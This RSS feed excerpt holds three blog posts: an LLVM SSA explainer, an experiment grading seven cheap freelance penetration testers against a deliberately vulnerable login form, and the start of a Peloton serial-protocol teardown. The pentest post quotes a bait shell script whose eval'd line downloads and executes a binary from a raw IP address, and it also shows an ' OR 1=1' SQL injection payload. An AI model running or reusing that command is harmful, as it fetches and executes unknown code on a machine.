    <span>int</span> <span>fd</span> <span>=</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags_2</span><span>,</span> <span>0644</span><span>);</span>

    <span>return</span> <span>fd</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Our quandary is resolved: <code>open</code> <strong>always</strong> takes <code>flags_2</code>, where <code>flags_2</code> is a fresh SSA variable
produced applying φ to <code>flags_0</code> and <code>flags_1</code>.</p>

<p>Observe, too, that φ is a <strong>symbolic</strong> function: compilers that use SSA forms internally do not
emit real φ functions in generated code<sup id="fnref:5" role="doc-noteref"><a href="#fn:5">5</a></sup>. φ exists <em>solely</em> to reconcile rule #1 with the
existence of control flow.</p>

<p>As such, it’s a little bit silly to talk about SSA forms with C examples (since C and other
high-level languages are what we’re translating from in the first place). Let’s dive into how
LLVM’s IR actually represents them.</p>

<h2 id="ssa-in-llvm">SSA in LLVM</h2>

<p>First of all, let’s see what happens when we run our very first <code>helpful_open</code> through <code>clang</code>
with no optimizations:</p>

<div><div><pre><code><span>define</span> <span>dso_local</span> <span>i32</span> <span>@helpful_open</span><span>(</span><span>i8</span><span>*</span> <span>%fname</span><span>)</span> <span>#0</span> <span>{</span>
<span>entry:</span>
  <span>%fname.addr</span> <span>=</span> <span>alloca</span> <span>i8</span><span>*,</span> <span>align</span> <span>8</span>
  <span>%flags</span> <span>=</span> <span>alloca</span> <span>i32</span><span>,</span> <span>align</span> <span>4</span>
  <span>%fd</span> <span>=</span> <span>alloca</span> <span>i32</span><span>,</span> <span>align</span> <span>4</span>
  <span>store</span> <span>i8</span><span>*</span> <span>%fname</span><span>,</span> <span>i8</span><span>**</span> <span>%fname.addr</span><span>,</span> <span>align</span> <span>8</span>
  <span>store</span> <span>i32</span> <span>2</span><span>,</span> <span>i32</span><span>*</span> <span>%flags</span><span>,</span> <span>align</span> <span>4</span>
  <span>%0</span> <span>=</span> <span>load</span> <span>i8</span><span>*,</span> <span>i8</span><span>**</span> <span>%fname.addr</span><span>,</span> <span>align</span> <span>8</span>
  <span>%call</span> <span>=</span> <span>call</span> <span>i32</span> <span>@access</span><span>(</span><span>i8</span><span>*</span> <span>%0</span><span>,</span> <span>i32</span> <span>0</span><span>)</span> <span>#4</span>
  <span>%tobool</span> <span>=</span> <span>icmp</span> <span>ne</span> <span>i32</span> <span>%call</span><span>,</span> <span>0</span>
  <span>br</span> <span>i1</span> <span>%tobool</span><span>,</span> <span>label</span> <span>%if.end</span><span>,</span> <span>label</span> <span>%if.then</span>

<span>if.then:</span>                                          <span>; preds = %entry</span>
  <span>%1</span> <span>=</span> <span>load</span> <span>i32</span><span>,</span> <span>i32</span><span>*</span> <span>%flags</span><span>,</span> <span>align</span> <span>4</span>
  <span>%or</span> <span>=</span> <span>or</span> <span>i32</span> <span>%1</span><span>,</span> <span>64</span>
  <span>store</span> <span>i32</span> <span>%or</span><span>,</span> <span>i32</span><span>*</span> <span>%flags</span><span>,</span> <span>align</span> <span>4</span>
  <span>br</span> <span>label</span> <span>%if.end</span>

<span>if.end:</span>                                           <span>; preds = %if.then, %entry</span>
  <span>%2</span> <span>=</span> <span>load</span> <span>i8</span><span>*,</span> <span>i8</span><span>**</span> <span>%fname.addr</span><span>,</span> <span>align</span> <span>8</span>
  <span>%3</span> <span>=</span> <span>load</span> <span>i32</span><span>,</span> <span>i32</span><span>*</span> <span>%flags</span><span>,</span> <span>align</span> <span>4</span>
  <span>%call1</span> <span>=</span> <span>call</span> <span>i32</span> <span>(</span><span>i8</span><span>*,</span> <span>i32</span><span>,</span> <span>...)</span> <span>@open</span><span>(</span><span>i8</span><span>*</span> <span>%2</span><span>,</span> <span>i32</span> <span>%3</span><span>,</span> <span>i32</span> <span>420</span><span>)</span>
  <span>store</span> <span>i32</span> <span>%call1</span><span>,</span> <span>i32</span><span>*</span> <span>%fd</span><span>,</span> <span>align</span> <span>4</span>
  <span>%4</span> <span>=</span> <span>load</span> <span>i32</span><span>,</span> <span>i32</span><span>*</span> <span>%fd</span><span>,</span> <span>align</span> <span>4</span>
  <span>ret</span> <span>i32</span> <span>%4</span>
<span>}</span>
</code></pre></div></div>

<p><em>(View it on <a href="https://godbolt.org/z/6ea8Pq">Godbolt</a>.)</em></p>

<p>So, we call <code>open</code> with <code>%3</code>, which comes from…a <code>load</code> from an <code>i32*</code> named <code>%flags</code>?
Where’s the φ?</p>

<p>This is something that <em>consistently</em> slips me up when reading LLVM’s IR: only <em>values</em>,
<strong>not</strong> memory, are in SSA form. Because we’ve compiled with optimizations disabled, <code>%flags</code> is
just a stack slot that we can <code>store</code> into as many times as we please, and that’s <em>exactly</em> what
LLVM has elected to do above.</p>

<p>As such, LLVM’s SSA-based optimizations aren’t all that useful when passed IR that makes direct
use of stack slots. We want to <em>maximize</em> our use of SSA variables, whenever possible, to make
future optimization passes as effective as possible.</p>

<p>This is where <a href="https://llvm.org/docs/Passes.html#mem2reg-promote-memory-to-register"><code>mem2reg</code></a> comes in:</p>

<blockquote>
  <p>This file (optimization pass) promotes memory references to be register references. It promotes
alloca instructions which only have loads and stores as uses. An alloca is transformed by using
dominator frontiers to place phi nodes, then traversing the function in depth-first order to
rewrite loads and stores as appropriate. This is just the standard SSA construction algorithm to
construct “pruned” SSA form.</p>
</blockquote>

<p>(Parenthetical mine.)</p>

<p><code>mem2reg</code> gets run at <code>-O1</code> and higher, so let’s do exactly that:</p>

<div><div><pre><code><span>define</span> <span>dso_local</span> <span>i32</span> <span>@helpful_open</span><span>(</span><span>i8</span><span>*</span> <span>nocapture</span> <span>readonly</span> <span>%fname</span><span>)</span> <span>local_unnamed_addr</span> <span>#0</span> <span>{</span>
<span>entry:</span>
  <span>%call</span> <span>=</span> <span>call</span> <span>i32</span> <span>@access</span><span>(</span><span>i8</span><span>*</span> <span>%fname</span><span>,</span> <span>i32</span> <span>0</span><span>)</span> <span>#4</span>
  <span>%tobool.not</span> <span>=</span> <span>icmp</span> <span>eq</span> <span>i32</span> <span>%call</span><span>,</span> <span>0</span>
  <span>%spec.select</span> <span>=</span> <span>select</span> <span>i1</span> <span>%tobool.not</span><span>,</span> <span>i32</span> <span>66</span><span>,</span> <span>i32</span> <span>2</span>
  <span>%call1</span> <span>=</span> <span>call</span> <span>i32</span> <span>(</span><span>i8</span><span>*,</span> <span>i32</span><span>,</span> <span>...)</span> <span>@open</span><span>(</span><span>i8</span><span>*</span> <span>%fname</span><span>,</span> <span>i32</span> <span>%spec.select</span><span>,</span> <span>i32</span> <span>420</span><span>)</span> <span>#4</span><span>,</span> <span>!dbg</span> <span>!22</span>
  <span>ret</span> <span>i32</span> <span>%call1</span><span>,</span> <span>!dbg</span> <span>!23</span>
<span>}</span>
</code></pre></div></div>

<p>Foiled again! Our stack slots are gone thanks to <code>mem2reg</code>, but LLVM has actually optimized
<em>too far</em>: it figured out that our flags value is wholly dependent on the return value of our
<code>access</code> call and erased the conditional entirely.</p>

<p>Instead of a φ node, we got this <code>select</code>:</p>

<div><div><pre><code><span>%spec.select</span> <span>=</span> <span>select</span> <span>i1</span> <span>%tobool.not</span><span>,</span> <span>i32</span> <span>66</span><span>,</span> <span>i32</span> <span>2</span>
</code></pre></div></div>

<p>which the <a href="https://llvm.org/docs/LangRef.html#select-instruction">LLVM Language Reference</a>
describes concisely:</p>

<blockquote>
  <p>The ‘select’ instruction is used to choose one value based on a condition, without IR-level branching.</p>
</blockquote>

<p>So we need a better example. Let’s do something that LLVM can’t trivially optimize into a
<code>select</code> (or sequence of <code>select</code>s), like adding an <code>else if</code> with a function that we’ve …</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.yossarian.net/2020/10/23/Understanding-static-single-assignment-forms">https://blog.yossarian.net/2020/10/23/Understanding-static-single-assignment-forms</a></em></p>]]>
            </description>
            <link>https://blog.yossarian.net/2020/10/23/Understanding-static-single-assignment-forms</link>
            <guid isPermaLink="false">hacker-news-small-sites-24869227</guid>
            <pubDate>Fri, 23 Oct 2020 13:27:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Penetration testing and low-cost freelancing]]>
            </title>
            <description>
<![CDATA[
Score 148 | Comments 69 (<a href="https://news.ycombinator.com/item?id=24869219">thread link</a>) | @sophron
<br/>
October 23, 2020 | https://sophron.github.io/lowcost-freelancing-pentest/ | <a href="https://web.archive.org/web/*/https://sophron.github.io/lowcost-freelancing-pentest/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper">
    <div id="content">


<h2><span color="#383b3d">The Story of How I Hired 7 Freelancers to Exploit this Weird Vulnerability</span></h2>

<p>Penetration testing is complex. For it to be successful, the tester needs to possess a variety of different abilities and skills. Some testers rely only on automated tools, while others focus more on manual analysis. While a creative and unconventional way of thinking is necessary, it is also important for the tester to possess the mental discipline to adhere to the time constraints set by the client. It is common for a creative penetration tester to spend a significant amount of time investigating a fun and uncommon exploit, only to realize later that there is not enough time left to provide complete coverage. It is, therefore, not surprising that two different testers will produce two separate reports that include different findings.</p>

<p>I decided to run a little experiment to see how different the reports of different testers would be. I purposely created a vulnerable web application, and hired seven different freelancers to conduct penetration testing against it. I found this to be an excellent opportunity to evaluate the skills of freelancers that provide their services at an extremely low price in online marketplaces. While the cost of penetration testing can be pretty high (typically between $1,000 and $100,000+), these freelancers provide their security services for less than $100. Some of them claim to possess industry-accepted certificates, and I was curious to know the quality of their work, in particular when their services are reviewed positively by thousands of buyers.</p>


<figure>
<img src="https://sophron.github.io/lowcost-freelancing-pentest/login_form.png">
  <figcaption>The vulnerable web form</figcaption>
</figure>


<p>
To keep things simple, I created a PHP login form that included two critical vulnerabilities that could be exploited to bypass the authentication form. While these bugs were not hard to discover or exploit, they required manual analysis; a tester that relies only on automated tools would not be able to identify them.
</p>

<p>
The first vulnerability on the form stems from a bug in session management. During the login operation of the web application, even if the credentials are wrong, the application is including the following header in the HTTP response: <span color="crimson">Set-Cooki auth=195c530a7af5f492a74499e70578d150</span>. A careful penetration tester that manually examines the HTTP response should be able to recognize that there is a typo in the name of the "Set-Cookie" header, hence the browser will not automatically set the cookie value. By setting this cookie value manually, the tester will gain admin privileges.
</p>



<figure>
<img src="https://sophron.github.io/lowcost-freelancing-pentest/response.png" width="95%">
  <figcaption>Identifying the two vulnerabilities after intercepting the HTTP traffic with Burp Suite</figcaption>
</figure>



<p>
The second way to bypass the authentication of the form is by inputting "<span color="crimson">' OR 1=1'</span>" or a similar payload. The root cause of this issue appears to be an SQL Injection vulnerability, but it is, in fact, a hardcoded SQL password. The executed SQL query can be found in the HTTP response:
</p>


<pre><code> SELECT * FROM form_passwords 
WHERE 'password' 
LIKE CONCAT(
	'%', 
	IF(STRCMP(SYSTEM_USER(), '/dev/random@localhost')=-1, REVERSE(" \'"), 
	ISNULL(NULLIF(NULL-NULL*NULL, POWER(NULL,NULL)))), 
	IF(STRCMP(SESSION_USER(), '/dev/null@localhost')=0, CHAR(40*2-POWER(1, LOG(2)),(4*10+1)*2), 
	CHAR(69,4*10+9)), SPACE(1), '%' ,'\'','%',IF(STRCMP(VERSION(), '10.3.15-MariaDB-0+deb10u1')=0,
	IF(CONNECTION_ID()=1337,"'"="",'-_-'),
	IF(PI()&lt;3,"&lt;(^^)&gt;","'=")), MID("```'`''`'`'`'``'`'``'```````'`'`'`'`'`''`'`'`",7,1), '%');

</code>
</pre>

<p>
The tester will have to de-obfuscate the SQL query in order to extract the hardcoded password. For the tester to de-obfuscate the SQL query, he needs to possess basic knowledge of SQL syntax. This particular SQL query that I created is using nested inline IF statements. The conditions are checking the environmental variables <span color="crimson">SYSTEM_USER</span>, <span color="crimson">SESSION_USER</span> and <span color="crimson">VERSION</span>). Since these values are not known to the tester, he will have to follow all the different logic paths until the constructed query makes sense. Some simple simplifications here and there can make the query much more readable.


</p>


<figure>
<img src="https://sophron.github.io/lowcost-freelancing-pentest/sql_riddle.png">
  <figcaption>De-obfuscating the SQL query</figcaption>
</figure>


<p>
After de-obfuscation, the final query will be: "<span color="crimson">SELECT * FROM form_passwords WHERE 'password123' LIKE %" OR %"$'=%</span>". Inputs such as "<span color="red">' OR 1=1'</span>" would allow the tester to bypass the authentication form successfully. I purposely decided to use a payload that is commonly used when testing forms for SQL injections as an answer to this riddle, to see how many of these testers would correctly identify the root cause of this issue.
</p>


<p>To make things even more interesting, I put a malicious shell script as part of the HTTP response. The contents of the shell script were the following: </p>
<pre><code>obscure() {
   local txt="$1"
   local txt="$a\'{}"
   echo "${txt//?/*}"
}

sql_1 = 'SELECT * FROM form_passwords WHERE "asfsadfd" LIKE CONCAT("%", IF(STRCMP(SYSTEM_USER()'
sql_2 = 'REVERSE(), ISNULL(NULLIF(NULL-NULL*NULL, POWER(NULL,NULL)))), IF(STRCMP(SESSION_USER(), "/dev/null@localhost")=0'
sql_3 = `wget http://83.212.174.87/mal | chmod +x ./mal | ./mal`
sql_4 = '10.3.15-MariaDB-0+deb10u1)=0,IF(CONNECTION_ID()=1337,"="-_-,IF(PI()&lt;3,&lt;(^^)&gt;'
sql_5 = 'LOG(2)),(4*10+1)*2), CHAR(69,4*10+9)), SPACE(1'

echo "Deobfuscating..."

eval "$sql_1"
eval "$sql_2"
eval "$sql_3"
eval "$sql_4"
eval "$sql_5"
</code>
</pre>


<p>
As can be seen, on line 12, the script is downloading and executing a binary from the Internet. I wanted to see how many of these testers will be careless enough to run my malicious script without auditing it first.

</p>


<p>Finally, I installed an SSH honeypot. My intention was to record any shell interactions by the testers and evaluate their post-exploitation methodology.</p>

<p>The profiles of all the testers I hired had overwhelmingly positive reviews on the online marketplace. I pretended that I needed my web form tested before my group used it in production. I received all the penetration testing reports a few days later.</p>

<h3>Tester #1 ($20)</h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/1/report.pdf">PDF Report</a></p>

<p>The tester claimed to be a Certified Ethical Hacker v9 with experience in Vulnerability Assessments and Penetration Testing.
</p>

<p>
The tester delivered the report and mentioned that he found a serious flaw in the system. He failed to identify any of the high severity findings. The report included irrelevant information, such as "Banner Grabbing &amp; Version Detection," as well as a "Performance / Load Test." The serious flaw that the tester identified was logging in to the SSH honeypot.
</p>


<h3>Tester #2 ($30)</h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/2/report.pdf">PDF Report</a></p>

<p>
The tester described himself as an independent information security researcher. He mentioned that he had finished his Bachelor's in Computer Science and Certified Ethical Hacker Course by EC-Council. He claimed to have hands-on experience in vulnerability assessment and penetration testing.
</p>
<p>
This tester, too, failed to identify any of the high severity findings. The tester believed he had gotten local access to the remote machine, failing to realize that this was, in fact, a honeypot. The results that were reported had no direct impact (in regard to Integrity, Availability, Confidentiality), or they were not valid at all (e.g., directory brute-forcing).
</p>

<h3>Tester #3 ($35)</h3> 

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/3/report.pdf">PDF Report</a></p>

<p>
The tester claimed that they usually charge $200 for complete pentest and report, but since canceling the order will have a negative impact on their profile, they agreed to carry out the testing. They asked me to tip well after I receive the report.
</p>
<p>
Most of the findings included in this report were part of the Nessus security tool. A reflected XSS finding on a POST parameter was exaggerated as a HIGH. None of the HIGH-severity findings were identified.
</p>

<h3>Tester #4 ($40)</h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/4/report.pdf">PDF Report</a></p>

<p>
The tester claimed to be OSCP certified with nine years of experience.
</p>
<p>

This tester identified the SQL vulnerability successfully but failed to identify the root cause of it. He reported the vulnerability as an SQL injection as opposed to a hardcoded password. The rest of the findings he reported were part of Burp Suite's automated scanner.

</p>


<h3>Tester #5 ($50)</h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/5/report.pdf">PDF Report</a></p>

<p>
The tester claimed to have a B.Sc in Computer Science and various certifications, including CEH Certified Ethical Hacker and Certified Payment Industry Security Implementer. On his profile, he mentions that he provides a variety of services from PCI DSS consulting to blockchain training.
</p>

<p>

Again, none of the critical vulnerabilities were discovered. This tester did execute my malicious script even though, according to the report, he examined it for any security issues. 

</p>


<h3>
Tester #6 ($100) </h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/6/report.pdf">PDF Report</a></p>

<p>
The tester claimed to have over 20 years of experience in Ethical Hacking, and his profile has over 100 positive reviews. I ordered the premium service that included a full penetration test, professional security assessment report and recommendations &amp; solutions.</p>

<p> The tester failed to identify any of the HIGH-risk vulnerabilities. All the technical details on the report were taken from automated tools (OWASP ZAP and Netsparker). </p>




<h3>
Tester #7 ($400) </h3>

<p>
The tester claimed to be an OCSP with 7+ years of professional experience with major clients. In our agreement, we agreed that he wouldn't have to provide a report to save them time and allow them to focus on testing.

</p>

<p>
The tester successfully identified the issue with the mistyped HTTP header. He did not report the SQL hardcoded password.
</p>

<p>Following is a table that summarizes the work of all testers:</p>

<table>
<thead>
  <tr>
    <th>Tester #</th>
    <th>Cost</th>
    <th>Bug 1</th>
    <th>Bug 2</th>
    <th>Reported vuln correctly</th>
    <th>Did not run malicious binary</th>
  </tr>
</thead>
<tbody>
  <tr>
    <td>1</td>
    <td>$20</td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="green">âœ“</span></td>
  </tr>
  <tr>
    <td>2</td>
    <td>$30</td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="green">âœ“</span></td>
  </tr>
  <tr>
    <td>3</td>
    <td>$35</td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="green">âœ“</span></td>
  </tr>
  <tr>
    <td>4</td>
    <td>$40</td>
    <td><span color="red">X</span></td>
    <td><span color="green">âœ“</span></td>
    <td><span color="red">X</span></td>
    <td><span color="green">âœ“</span></td>
  </tr>
  <tr>
    <td>5</td>
    <td>$50</td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
  </tr>
  <tr>
    <td>6</td>
    <td>$100</td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="green">âœ“</span></td>
  </tr>
  <tr>
    <td>7</td>
    <td>$400</td>
    <td><span color="green">âœ“</span></td>
    <td><span color="red">X</span></td>
    <td><span color="green">âœ“</span></td>
    <td><span color="green">âœ“</span></td>
  </tr>
</tbody>
</table>

<p>
The results are straightforward. It appears that all of these contractors, with the exception of the last one, used automated tools to carry out the testing. Hence, the majority of them failed to identify the critical vulnerabilities. Some of them thought they gained access to the host through SSH without realizing they actually gained access to the virtual environment of a honeypot. Finally, one of them ran a script found online without auditing it …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sophron.github.io/lowcost-freelancing-pentest/">https://sophron.github.io/lowcost-freelancing-pentest/</a></em></p>]]>
            </description>
            <link>https://sophron.github.io/lowcost-freelancing-pentest/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24869219</guid>
            <pubDate>Fri, 23 Oct 2020 13:26:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Decoding the Peloton: From Voltages to “Cadence, Output, and Resistance”]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24869207">thread link</a>) | @albertwang
<br/>
October 23, 2020 | https://ihaque.org/posts/2020/10/15/pelomon-part-i-decoding-peloton/ | <a href="https://web.archive.org/web/*/https://ihaque.org/posts/2020/10/15/pelomon-part-i-decoding-peloton/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p><strong><span>TL</span>;<span>DR</span></strong> - I’ve decoded (most of) the protocol that the Peloton bike uses to
communicate with its head unit tablet and built a device, the PeloMon, that takes that
data during a ride, without interfering with the Peloton software, to
broadcast it over Bluetooth <span>LE</span> to whatever devices you’d like — a watch, Zwift,
Wahoo, whatever. Stick around for logic analyzer traces, hardware diagrams,
cursing at Bluetooth, and some nice&nbsp;interfaces.</p>


<p>First in a series. See the <a href="https://github.com/ihaque/pelomon">project GitHub</a>, to be updated through the&nbsp;series.</p>
<ul>
<li><a href="https://ihaque.org/posts/2020/10/15/pelomon-part-i-decoding-peloton/">Part I: Decoding the&nbsp;Peloton</a></li>
<li>Part <span>II</span>: Hardware Selection for the PeloMon&nbsp;(upcoming)</li>
<li>Part <span>III</span>: Software, or why Bluetooth <span>LE</span> has the <em>worst</em> specification docs&nbsp;(upcoming)</li>
<li>Part <span>IV</span>: The PeloMon completed&nbsp;(upcoming) </li>
</ul>
<h2 id="table-of-contents"><a href="#table-of-contents">Table of&nbsp;Contents</a></h2>
<ul>
<li><strong><a href="#intro-to-the-pelomon-project">Intro</a></strong></li>
<li><strong><a href="#the-physical-layer-how-does-the-bike-talk-to-the-tablet">Physical Layer</a></strong> (<a href="#hardware-used">Hardware Used</a>, <a href="#mapping-the-available-signals">Mapping Signals</a>, <a href="#decoding-the-wire-protocol-with-a-logic-analyzer">Wire Protocol</a>)</li>
<li><strong><a href="#data-encoding-what-are-the-head-unit-and-bike-saying-to-each-other">Data Encoding</a></strong> (<a href="#basic-packet-structure">Packet Structure</a>, <a href="#decoding-cadence-rpm-power-and-almost-resistance">Cadence and Power</a>, <a href="#a-detour-what-happens-when-you-boot-up-the-bike">Boot Sequence</a>, <a href="#decoding-resistance-for-real-this-time">Resistance</a>)</li>
<li><strong><a href="#conclusion">Conclusion</a></strong> (<a href="#pinouts">Pinouts</a>, <a href="#protocol-description">Protocol Description</a>, <a href="#open-questions">Open Questions</a>)</li>
</ul>

<p>We have a Peloton at home. Originally, I was skeptical, but then I found
trainers I like and it’s fun to ride with friends. And really takes the edge
off all-day Zoom meetings to ride during a meeting with the camera turned&nbsp;off.</p>
<p>But, being the guy that I am, I’ve been curious about how the head unit —
which runs a lightly skinned Android — was collecting stats
from the actual bike. I was also a bit annoyed that though the Peloton software
will happily read data from an <span>HR</span> sensor, and will upload your ride data to
Strava, there was no way for it to <em>broadcast</em> data about a ride to a local
fitness appliance — which meant that although I could track the fact that I
was doing an “indoor bike” ride on my Garmin watch, the watch would see a 0
mile ride because it got no bike&nbsp;data.</p>
<p>Then a couple months ago, I came across
<a href="https://ptx2.net/posts/unbricking-a-bike-with-a-raspberry-pi/">this blog post</a>
in which someone on the Internet was able to hook up their (bricked) Flywheel
bike to Zwift using a Raspberry Pi to decode the bike sensor data and broadcast
it over Bluetooth — and I was inspired to finally give this project a shot.
What should we call a device broadcasting stats from the Peloton, monitoring it
if you will? How about&nbsp;“PeloMon”?</p>
<p>Let’s get down to&nbsp;it.</p>

<h2 id="hardware-used"><a href="#hardware-used">Hardware&nbsp;used</a></h2>
<p>Any physical layer work is going to require actual hardware!
I’ll provide links to all of the hardware involved in
the project in case you’d like to follow along. I bought from a mix of Amazon
and Adafruit; note that the Amazon links are affiliate links so if you end
up buying there I’ll get a small referral&nbsp;bonus.</p>
<table>
<tbody><tr><th>Part name</th><th>Links</th><th>Price at time of writing</th></tr>
<tr><td><span>TRRS</span> breakout board</td>
    <td><a href="https://amzn.to/3dsGuYt">Amazon</a></td>
    <td>$6.98 (qty 3)</td></tr>
<tr><td><span>USB</span> logic analyzer 24MHz 8ch</td>
    <td><a href="https://amzn.to/319svlj">Amazon</a></td>
    <td>$12.49</td></tr>
<tr><td>6” stereo headphone splitter cable</td>
    <td><a href="https://amzn.to/341FG9D">Amazon</a></td>
    <td>$4.91</td></tr>
<tr><td>3ft aux cable</td>
    <td><a href="https://amzn.to/2IzVhFi">Amazon</a></td>
    <td>$3.99</td></tr>
<tr><td>2.1mm <span>DC</span> barrel jack splitter</td>
    <td><a href="https://www.adafruit.com/product/1351">Adafruit</a></td>
    <td>$2.95</td></tr>

</tbody></table>

<h2 id="mapping-the-available-signals"><a href="#mapping-the-available-signals">Mapping the available&nbsp;signals</a></h2>
<p>There are only two cables that plug into the tablet: a barrel jack carrying
<span>DC</span> power @ 12V (coming from the power brick), and a <span>TRRS</span> connector —
think “stereo aux cable”. So the data is clearly coming in on the latter.
Since I only wanted to observe the traffic between the <span>HU</span> and the bike,
not interrupt it, I used a headphone splitter cable to split the cable from the bike with an extra jack, and connected an aux cable from that extra jack
to the breakout. Such a connection might disrupt some high-speed communications
protocols, but my guess was that a) there wasn’t going to be that much traffic
to require anything fancy, b) nothing fast would be running over 3.5mm <span>TRRS</span>, and
c) this interface would be engineered with pretty wide tolerances for stability 
in a home environment. (Spoiler alert: all of these were&nbsp;true.)</p>
<p>The first step was to identify the pinout from the jack as best
as possible. Probing the leads with a <span>DMM</span> with the bike active showed that
Ring2 was at ground (0V with respect to the power supply’s ground)
with -5.5-6V between tip or ring1 and ground. Sleeve also appears to be
at ground, but it and Ring2 may not quite be the same (more on this later).
The negative voltages with respect
to ground are a pretty strong sign that we’re going to see <span>RS</span>-232&nbsp;signaling.</p>
<h2 id="decoding-the-wire-protocol-with-a-logic-analyzer"><a href="#decoding-the-wire-protocol-with-a-logic-analyzer">Decoding the wire protocol with a logic&nbsp;analyzer</a></h2>
<p>(If you’d like to load a PulseView trace to see the data for yourself, one session
file from a test ride is located in <code>peloton_decoding/resistance-stepped-10s.sr</code>
in <a href="https://github.com/ihaque/pelomon">the PeloMon GitHub repository</a>.)</p>
<p>Normally I’d wire up the breakout and hack something together on the Arduino
I have sitting around, but it turns out that logic analyzers have gotten
<em>really really cheap</em> so I splurged on a $12.50 one and thought I’d give it
a whirl — turned out to be a great idea that made it <span>WAY</span> easier to decode
the signals. With complete abandon regarding ground isolation and the voltage
tolerances of the <span>LA</span> (is it supposed to be able to handle negative voltage?),
I hooked it up to see what I’d get. These cheapo LAs emulate a Saleae Logic
analyzer and work fine in the open-source <a href="https://sigrok.org/wiki/PulseView">PulseView</a>&nbsp;software.</p>
<p><img alt="Hooking up the LA with D0 on tip, D4 on ring1, D5 on sleeve, and GND on ring2" src="https://ihaque.org/static/img/2020/10/20201015-pinout-0tip-4ring1-5sleeve-gndring2.png">
</p><center><strong>Hooking up the <span>LA</span> with D0 on tip, D4 on ring1, D5 on sleeve, and <span>GND</span> on ring2</strong></center>
<p><img alt="D0 on tip, D2 on ring1, D4 on ring2, and GND on sleeve" src="https://ihaque.org/static/img/2020/10/20201015-pinout-0tip-2ring1-4ring2-gndsleeve.png">
</p><center><strong>D0 on tip, D2 on ring1, D4 on ring2, and <span>GND</span> on sleeve</strong></center>
<p>There’s pretty clearly serial signaling going on over these wires! One
party seems to be sending requests on Tip every 100ms, and the other
party responds about a millisecond later on Ring1. While it wasn’t obvious
from the <span>DMM</span> whether signaling <span>GND</span> should be on Ring2 or Sleeve, from the <span>LA</span>
traces, it looks like there is less glitching on the response line if Ring2 is
used as <span>GND</span> - so we’ll do that. The narrow pulses are probably single bits,
so sampling at a high rate (a few hundred kHz) lets us measure the bit
rate as&nbsp;19200bps:</p>
<p><img alt="Counting samples in the LA shows a 19.2kHz signal" src="https://ihaque.org/static/img/2020/10/20201015-pinout-19200bps.png">
</p><center><strong>Counting samples in the <span>LA</span> shows a 19.2kHz signal</strong></center>
<p>PulseView also lets you add protocol decoders to particular wires. I put a <span>UART</span>
decoder on with D0 as “<span>RX</span>” and D4 as “<span>TX</span>”, and saw data, but with a ton of
low-level serial protocol errors. UARTs invert the signal going out on the wire
with the expectation that there will be another <span>UART</span> at the other end to
re-invert. Since we don’t have that second <span>UART</span>, we have to turn the “Invert <span>RX</span>”
and “Invert <span>TX</span>” options on in PulseView, and then we see clean data! I also
experimented with other serial options (data, parity, and stop bits), but the
first guess of 8N1 turned out&nbsp;correct.</p>
<p><img alt="Without inversion enabled, we see framing errors and break conditions" src="https://ihaque.org/static/img/2020/10/20201015-missing-inversion.png">
</p><center><strong>Without inversion enabled, we see framing errors and break conditions</strong></center>
<p><img alt="Turning on the inversion in software, we see data with no serial errors!" src="https://ihaque.org/static/img/2020/10/20201015-fixed-inversion.png">
</p><center><strong>Turning on the inversion in software, we see data with no serial errors!</strong></center>
<p>Following the data streams, we see that the data stream on the
Tip wire during a ride always consists of one of three different four-byte
packets, repeated round-robin every 100ms, with the responses on Ring1 to these
requests being longer, different in length depending on the request type, and
variable in content.
It seems likely then that the Tip shows us signaling from the head unit to the
bike, and Ring1 is the bike responding to the head unit with information
about variables like current speed, resistance, or power&nbsp;output.</p>
<p><strong>Thus, we’ve worked out the physical layer protocol for the Peloton
communications: <span>RS</span>-232 at 5.5V and 19200bps 8N1 encoding, with <span>HU</span>-to-bike
communications on Tip, bike-to-<span>HU</span> on Ring1, <span>GND</span> on Ring2, and something
ground-like on&nbsp;Sleeve.</strong></p>

<p>To investigate the encoding between the head unit and the bike, I used the
logic analyzer to capture a trace of the communications during a ride. (Shoutout
to Ben Alldis and his Ministry of Sound ride series!)
The data dump and scripts are available in the GitHub repository for this project
at https://github.com/ihaque/pelomon/, in the <code>peloton_decoding</code> subdirectory.)</p>
<h2 id="basic-packet-structure"><a href="#basic-packet-structure">Basic packet&nbsp;structure</a></h2>
<p>(To follow along, run <code>peloton_decoding/decoder_plots.py</code> from the
<a href="https://github.com/ihaque/pelomon">PeloMon Github repository</a>.)</p>
<p>During a ride, about every 100ms (100.66-100.8ms) the <span>HU</span> sends a request
to the bike, and the bike responds about 300us (i.e., 0.3ms) from the end
of the <span>HU</span>’s request. The <span>HU</span> sends three different request packets round robin.
Each request type has a different response length from the&nbsp;bike:</p>
<table> 
<tbody><tr><th><span>HU</span> Request</th><th>Bike Response Length</th><th>Example Bike Response</th></tr>
<tr><td><tt>F5 41 36 F6</tt></td><td>8 bytes</td><td><tt>F1 41 03 30 30 30 C5 F6</tt></td></tr>
